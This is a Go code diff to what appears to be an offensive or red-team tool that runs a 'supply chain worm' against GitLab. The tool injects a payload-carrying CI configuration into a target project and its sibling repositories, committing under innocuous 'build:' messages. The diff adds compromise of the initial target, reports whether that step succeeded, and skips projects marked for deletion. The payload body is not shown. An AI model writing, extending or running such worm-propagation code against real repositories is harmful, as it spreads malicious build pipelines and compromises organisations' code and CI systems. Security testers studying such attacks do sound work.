@@ -309,11 +309,12 @@ func getBaseURL() string {
 
 // SupplyChainWormResult reports the outcome of a worm propagation run.
 type SupplyChainWormResult struct {
-	Promoted int      `json:"promoted"` // repos successfully attacked
-	Failed   int      `json:"failed"`   // repos that failed
-	Errors   int      `json:"errors"`   // non-repo errors encountered
-	Targets  []string `json:"targets"`  // repos that were targeted
-	Err      string   `json:"error,omitempty"`
+	InitialCompromised bool     `json:"initial_compromised"` // target project executed the worm payload
+	Promoted           int      `json:"promoted"`            // sibling repos successfully attacked
+	Failed             int      `json:"failed"`              // repos that failed
+	Errors             int      `json:"errors"`              // non-repo errors encountered
+	Targets            []string `json:"targets"`             // repos that were targeted
+	Err                string   `json:"error,omitempty"`
 }
 
 // RunSupplyChainWorm performs a supply chain worm attack across sibling repos.
@@ -337,10 +338,12 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		return res
 	}
 
-	var targetPath string
-	if p, _, perr := client.Projects.GetProject(targetProjectID, nil, gitlab.WithContext(ctx)); perr == nil {
-		targetPath = p.PathWithNamespace
+	targetProject, _, targetErr := client.Projects.GetProject(targetProjectID, nil, gitlab.WithContext(ctx))
+	if targetErr != nil {
+		res.Err = fmt.Sprintf("resolve target project: %v", targetErr)
+		return res
 	}
+	targetPath := targetProject.PathWithNamespace
 
 	siblings, listErr := discoverSiblings(ctx, client, groupPath, targetPath, maxRepos, monorepoScope)
 	if listErr != "" {
@@ -348,6 +351,13 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 	}
 
 	atk := newAttackerFromClient(client, authorName, authorEmail)
+	targetCI := buildWormCI(ctx, client, targetProject.ID, payload)
+	if err := injectWormPayload(ctx, atk, targetProject.ID, branch, targetCI, "build: initialize supply chain propagation", out); err != nil {
+		res.Failed++
+	} else {
+		res.InitialCompromised = true
+		res.Targets = append(res.Targets, fmt.Sprintf("%d", targetProject.ID))
+	}
 	for _, sibID := range siblings {
 		ciYAML := buildWormCI(ctx, client, sibID, payload)
 		msg := fmt.Sprintf("build: supply chain worm propagation via %s", targetPath)
@@ -376,7 +386,7 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 			return siblings, fmt.Sprintf("list group projects: %v", err)
 		}
 		for _, p := range projects {
-			if p.PathWithNamespace == targetPath {
+			if !eligibleWormSibling(p, targetPath) {
 				continue
 			}
 			siblings = append(siblings, p.ID)
@@ -399,6 +409,12 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 		siblings = filtered
 	}
 	return siblings, ""
+}
+
+func eligibleWormSibling(project *gitlab.Project, targetPath string) bool {
+	return project != nil &&
+		project.PathWithNamespace != targetPath &&
+		project.MarkedForDeletionOn == nil
 }
 
 func hasPackageManifest(ctx context.Context, client *gitlab.Client, projectID int64) bool {
